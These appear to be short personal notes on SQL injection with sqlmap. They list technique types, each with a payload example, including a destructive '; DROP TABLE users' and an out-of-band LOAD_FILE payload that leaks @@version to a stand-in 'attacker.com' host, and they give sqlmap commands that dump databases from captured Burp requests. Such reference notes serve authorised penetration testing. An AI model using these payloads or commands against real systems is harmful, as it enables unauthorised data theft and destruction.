# SQL Injection Playbook

## SQL Map

*SQL injection techniques with SQL Map*

The technique characters BEUSTQ refers to the following:

**B:** Boolean-based blind (Example: ```1=1```)

**E:** Error-based (Example: ```AND GTID_SUBSET(@@version,0)```)

**U:** Union query-based (Example: ```UNION ALL SELECT 1,@@version,3```) <-- Fastest SQLi

**S:** Stacked queries (Example: ```; DROP TABLE users```)

**T:** Time-based blind (Example: ```AND 1=IF(2>1,SLEEP(5),0)```)

**Q:** Inline queries (Example: ```SELECT (SELECT @@version) from```)

**Out of band injection** (Example: ```LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))```)
This is generally considered one of the most advanced forms of attacks and only is used when the others fail

### **SQL Map Notes:**
  * The switch '--batch' is used for skipping any required user-input, by automatically choosing using the default option.

  * When providing data for testing to SQLMap, there has to be either a parameter value that could be assessed for SQLi vulnerability or specialized options/switches for automatic parameter finding (e.g. --crawl, --forms or -g).

### *SQLMap Get Request*

```
sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
```

### *SQLMap JSON Request*
Go into burpsuite and you get an initial request, forward that, THEN capture that request. Right click, save to document and name it what you want. Then you can just use:
```
sqlmap -r fileyoumade.txt --batch --dump
```